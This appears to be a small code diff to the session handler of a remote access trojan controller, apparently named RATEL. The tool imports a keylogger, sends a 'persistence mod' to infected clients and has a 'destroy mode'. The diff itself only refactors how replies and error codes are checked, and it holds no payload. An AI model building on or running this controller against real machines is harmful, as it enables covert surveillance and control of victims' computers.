@@ -11,6 +11,7 @@ from .handler import Handler
 from .sql import Sql
 from .spawnshell import FakeCmd
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SPLIT
+from .other import dict_error_codes
 from .keylogger import Keylogger
 
 import threading
@@ -100,11 +101,7 @@ class Session:
             #printColor("information","[+] the p
             # persistence mod was sent.\n")
             
-            reponse = CheckConn().recvsafe(self.sock,4096)
-            if(reponse == "\r\n"):#Mod persi ok  
-                printColor("successfully","\n[+] the persistence mod is well executed with success..\n")
-            else:
-                printColor("error","[-] the persistence mod could not be executed on the client.")
+            CheckConn().recvmod(self.sock,4096)
 
         else:
             printColor("error","[+] the persistence mod was not sent.\n")
@@ -121,7 +118,7 @@ class Session:
                 
                 reponse = CheckConn().recvsafe(self.sock, 4096).split(SPLIT)
                 
-                if(reponse[1] == "True" ): 
+                if(reponse[1] == "RATEL_ERROR_FAILS"): 
                 
                     printColor("error", "\n[-] An error occurred while executing the destroy mode.")
                     printColor("error","[-] The client The connection therefore stays active.\n")
